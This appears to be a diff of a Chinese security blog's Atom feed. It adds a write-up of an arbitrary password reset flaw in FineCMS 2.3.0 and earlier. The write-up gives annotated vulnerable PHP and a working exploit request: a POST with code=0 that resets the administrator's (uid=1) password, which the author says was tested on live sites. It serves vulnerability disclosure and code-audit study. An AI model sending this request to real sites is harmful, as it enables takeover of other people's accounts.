@@ -426,19 +426,6 @@ W/System.err(<span class="number">24780</span>):    <span class="keyword">at</sp
   </entry>
   
   <entry>
-    <title><![CDATA[使用python识别验证码]]></title>
-    <link href="http://xdxd.love/2016/04/05/%E4%BD%BF%E7%94%A8python%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
-    <id>http://xdxd.love/2016/04/05/使用python识别验证码/</id>
-    <published>2016-04-05T06:27:34.000Z</published>
-    <updated>2016-04-05T06:27:34.000Z</updated>
-    <content type="html"></content>
-    <summary type="html">
-    
-    </summary>
-    
-  </entry>
-  
-  <entry>
     <title><![CDATA[sql注入load_file fuzz]]></title>
     <link href="http://xdxd.love/2016/04/05/sql%E6%B3%A8%E5%85%A5load-file-fuzz/"/>
     <id>http://xdxd.love/2016/04/05/sql注入load-file-fuzz/</id>
@@ -959,6 +946,68 @@ select_expr [, select_expr ...]
     </summary>
     
       <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[finecms <= 2.3.0 任意用户密码修改]]></title>
+    <link href="http://xdxd.love/2016/03/03/finecms-2-3-0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/"/>
+    <id>http://xdxd.love/2016/03/03/finecms-2-3-0-任意用户密码修改/</id>
+    <published>2016-03-03T14:32:33.000Z</published>
+    <updated>2016-03-03T14:38:18.000Z</updated>
+    <content type="html"><![CDATA[<p>影响版本14年4月18号更新的2.3.0及以前的版本。最新版不存在这个问题。<br>乌云爆过一个<a href="http://www.wooyun.org/bugs/wooyun-2014-060197" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-060197</a> 利用暴力破解验证码的方式来重置密码，这里讨论的方式相对于暴力破解来说成本更低。</p>
+<p>直接看代码验证验证码的逻辑：逻辑分析下载注释中。</p>
+<p>case 2:</p>
+<pre><code>                        <span class="variable">$uid</span> = (int)<span class="variable">$this-</span>&gt;input-&gt;get(<span class="string">'uid'</span>);
+                        <span class="variable">$code</span> = (int)<span class="variable">$this-</span>&gt;input-&gt;post(<span class="string">'code'</span>);
+                        从post获取验证码。
+                        <span class="variable">$data</span> = <span class="variable">$this-</span>&gt;db
+                                                 -&gt;<span class="keyword">where</span>(<span class="string">'uid'</span>, <span class="variable">$uid</span>)
+                                                 -&gt;<span class="keyword">where</span>(<span class="string">'randcode'</span>, <span class="variable">$code</span>)
+                          根据验证码和UID从数据库中查询数据。
+                                                 -&gt;select(<span class="string">'salt,uid,username,email'</span>)
+                                                 -&gt;limit(<span class="number">1</span>)
+                                                 -&gt;get(<span class="string">'member'</span>)
+                                                 -&gt;row_array();
+                        <span class="keyword">if</span> (!<span class="variable">$data</span>) {
+                        如果查不到该验证码对应的数据，提示错误。
+        <span class="variable">$this-</span>&gt;member_msg(lang(<span class="string">'m-000'</span>));
+    }
+
+                        <span class="variable">$password1</span> = <span class="variable">$this-</span>&gt;input-&gt;post(<span class="string">'password1'</span>);
+                        <span class="variable">$password2</span> = <span class="variable">$this-</span>&gt;input-&gt;post(<span class="string">'password2'</span>);
+                        <span class="keyword">if</span> (<span class="variable">$password1</span> != <span class="variable">$password2</span>) {
+                                <span class="variable">$error</span> = lang(<span class="string">'m-019'</span>);
+                        } elseif (!<span class="variable">$password1</span>) {
+                                <span class="variable">$error</span> = lang(<span class="string">'m-018'</span>);
+                        } <span class="keyword">else</span> {
+                                // 修改密码
+                                <span class="variable">$this-</span>&gt;db
+                                         -&gt;where(<span class="string">'uid'</span>, <span class="variable">$data</span>[<span class="string">'uid'</span>])
+                                         -&gt;update(<span class="string">'member'</span>, array(
+                        成功修改密码之后，验证码randcode设置为<span class="number">0</span>！！！！！
+                                                <span class="string">'randcode'</span> =&gt; <span class="number">0</span>,
+                                                <span class="string">'password'</span> =&gt; md5(md5(<span class="variable">$password1</span>).<span class="variable">$data</span>[<span class="string">'salt'</span>].md5(<span class="variable">$password1</span>))
+                                         ));
+                                if (<span class="variable">$this-</span>&gt;get_cache(<span class="string">'MEMBER'</span>, <span class="string">'setting'</span>, <span class="string">'ucenter'</span>)) {
+            uc_user_edit(<span class="variable">$data</span>[<span class="string">'username'</span>], <span class="string">''</span>, <span class="variable">$password1</span>, <span class="string">''</span>, <span class="number">1</span>);
+        }
+                                <span class="variable">$this-</span>&gt;member_msg(lang(<span class="string">'m-052'</span>), dr_url(<span class="string">'login/index'</span>), <span class="number">1</span>);
+                        }
+                        break;
+        }
+}
+</code></pre><p>这里一个逻辑问题就是，修改密码之后，验证码设置为零。去数据库中看了一下，这个字段的默认值是0，而判断验证码之前没有对验证码是否是0进行判断。导致使用0作为验证码可以直接修改任意账号的密码。这种方式在黑盒的任意密码重置案例中并没有见到过。<br><img src="/images/finecms5.jpg" alt=""></p>
+<p>利用方式，直接post url：</p>
+<pre><code><span class="string">http:</span><span class="comment">//www.<span class="label">xxxxxxx.com/member/index.php?c=login&amp;m=find&amp;step=2&amp;uid=1</span></span>
+</code></pre><p>这里uid=1为管理员。 post 数据为code=0&amp;password1=12345678&amp;password2=12345678<br>在互联网实例中测试。</p>
+<p><img src="/images/finecms6.jpg" alt=""></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>影响版本14年4月18号更新的2.3.0及以前的版本。最新版不存在这个问题。<br>乌云爆过一个<a href="http://www.wooyun.org/bugs/wooyun-2014-060197" target="_blank" rel="external">ht]]>
+    </summary>
+    
+      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
   </entry>
   
